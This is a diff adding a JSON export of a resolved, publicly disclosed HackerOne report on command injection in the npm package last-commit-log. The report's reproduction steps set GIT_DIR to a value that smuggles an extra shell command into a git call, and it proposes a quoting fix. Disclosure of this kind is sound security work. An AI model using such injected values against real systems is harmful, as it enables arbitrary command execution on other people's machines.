@@ -1,0 +1,140 @@
+{
+  "id": 881713,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODE3MTM=",
+  "url": "https://hackerone.com/reports/881713",
+  "title": "[last-commit-log] Command Injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-24T11:57:12.726Z",
+  "submitted_at": "2020-05-24T11:57:12.726Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bilk0h",
+    "url": "/bilk0h",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/WhrKbR7g71mGdMArexY3FvSb/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-29T11:06:29.469Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-10-30T11:06:28.970Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report `Command Injection` in `last-commit-log`\nIt allows `execution of arbitrary commands`\n\n# Module\n\n**module name:** `last-commit-log`\n**version:** `last-commit-log@3.0.4`\n**npm page:** `https://www.npmjs.com/package/last-commit-log`\n\n## Module Description\n\nNode.js module to get the last git commit information - mostly to be used by CI/CD and building phase.\n\n## Module Stats\n\n[3,253] downloads in the last week\n\n# Vulnerability\n\nThe value of the GIT_DIR env variable is added to the command here on [line 10](https://github.com/node-modules/last-commit-log/blob/master/index.js#L10) and here on [line 25](https://github.com/node-modules/last-commit-log/blob/master/index.js#L25) and finally the command is executed on [line 36](https://github.com/node-modules/last-commit-log/blob/master/index.js#L36).\n\n## Vulnerability Description\n\n## Steps To Reproduce:\n> npm i last-commit-log\n>cat > test.js\nconst LCL = require('last-commit-log');\nconst lcl = new LCL('.'); // or `new LCL(dir)` dir is process.cwd() by default\n>lcl\n  .getLastCommit()\n  .then(commit => console.log(commit));\n\nExport malicious GIT_DIR string\n>export GIT_DIR=\". ;touch xxx;\"\n\nRun\n>node test.js\n\n\n{F840963}\n\n## Patch\n\nFix: enclose --git-dir flag in quotes on line 10 like so\n```this.gitDirStr = GIT_DIR ? `--git-dir=\"${GIT_DIR}/.git\"` : '';```\n\n## Supporting Material/References:\n\n- [OPERATING SYSTEM VERSION] Ubuntu 18.04.4 LTS\n- [NODEJS VERSION] v14.0.0\n- [NPM VERSION] 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [Y/N] No\n- I opened an issue in the related repository: [Y/N] No\n\n## Impact\n\nAbility to run any command available for attacker.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 840963,
+      "file_name": "last-commit-log-demo.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yPUCbZfR6x6axN3v9rEuSEmA?response-content-disposition=attachment%3B%20filename%3D%22last-commit-log-demo.gif%22%3B%20filename%2A%3DUTF-8%27%27last-commit-log-demo.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4XVEC7DX%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151638Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDV4%2BChPJM%2B8PNFbk5eceTQs%2BQtJY1UdHgd5V2A6x0KBwIhAOD%2FNh9VfSICps7HrjJ2P3uuHh2t5atU%2BC%2B0GfFC%2FnveKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwzqnWBEKpx6gntddQqjgVETUn%2Ff0bvFQFYh4RXQ2%2FI4OnAtmZPxVf2cYaUTuS0zqaSFwGGRxqezLpUJeG0w0OA%2BDZglchPkJrl84dtG8%2B6T3FAZFRRXZ2suv7jT%2F5JHYuNpRr8F7DfmXWtKf9tLQggPs%2Bf5kmpm%2BXgMdFwre9skaKv4LZBiDGs%2Bw2TZp3kH1XeDuRSHc2Axh4b4QEG5fDhNSZh0WQvsPWtYIrrsQyPEBPDzPzV2H1tdEel%2BEkJjGzyxAHvQHKmwk1sue%2Bir27ipARMCIq4Xu%2FD%2B80TS4GY014fBhcHqCS8QokbLyYu9qs4sgyf3DE7uSETf1rXrZNHLe8WFhre9ZSoMB9RUDNuTQE%2B5BgNthEzXCspxZSwgR02lHBz9%2FV3qo%2BdbEPNqiz3%2BfZv7yXpJThsbGwNe7WpVwMsn6gk55FpttQdehJ2Or2PRy0aUkUMMvu8Uw52zTLJLVJgGIHSIFgGnJJxgAjzxvlWMKTs2raCEKoG4Q23Xtiz118GyDwnGTavOQcgz57Oiu9wG2Xgm%2BPoUf5mV8QeWCCjocdCw2%2F4i%2BqDJlTAwjECw3LPkJ4WY0RLIhDWC6pfOrSeLfOUQGqtHLb1BJlQe0oUYGoONx%2FTUXlGCLn4XA6FRGebzjUVBwgnAQjQKIkd9Tlq82GtatswcFGxra%2BUvYPJXVUfOW1oqfIhLAOmeh%2FNc%2FKn1x7fh2%2Fg9a5lA9xA5W%2F0sFJr5kTZTQYICxupwXVjkTuISMUdHOUiJKWbzIeTsbLOyX5UJIVn4rSXTciywMtMg%2Bd6n5XBf3Gdin1DHsQYvLuMuuD7GYr03AqQGr01XCrST%2BGpLKwEh8TzAQShHX9uWt8qwABILe9lXvGeDpbISaNnPN%2BCXO4sF1kwv%2F%2F8zwY6sAEF38ohyRoe8KyJy%2FJjsNeK%2B7rd61tF0y%2FCvl62y00Gg7p7oU4b6OpTjqEMJl1c9jrLsaHKR%2BJFlO47gf4gLps%2BjPkhHBZ%2FlyHRO%2FnbilOO%2F7v7h2f2ouJJdopubheJ%2F1afVm8sjNtXl1xAsU8OUfjmTVDzJuwd%2F%2FEbnLRGy9tBB8DWbipxyoo9HxFJxueEf4%2BnK6YWfN6kUYiOCmiS%2Bi%2FF3x2FHUXwRLd6LOEB4hndiw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ca760e0c9fb2ffb4cf1e565b36792e472a8331c1427e95da8a68aea5deff6a02",
+      "file_size": 53721,
+      "type": "image/gif",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-29T11:06:29.089Z",
+  "allow_singular_disclosure_after": -171691809.5165085,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "h4x0r_dz",
+    "khizer47",
+    "luc1d",
+    "devesh200",
+    "secur123breaker",
+    "xarcabard"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
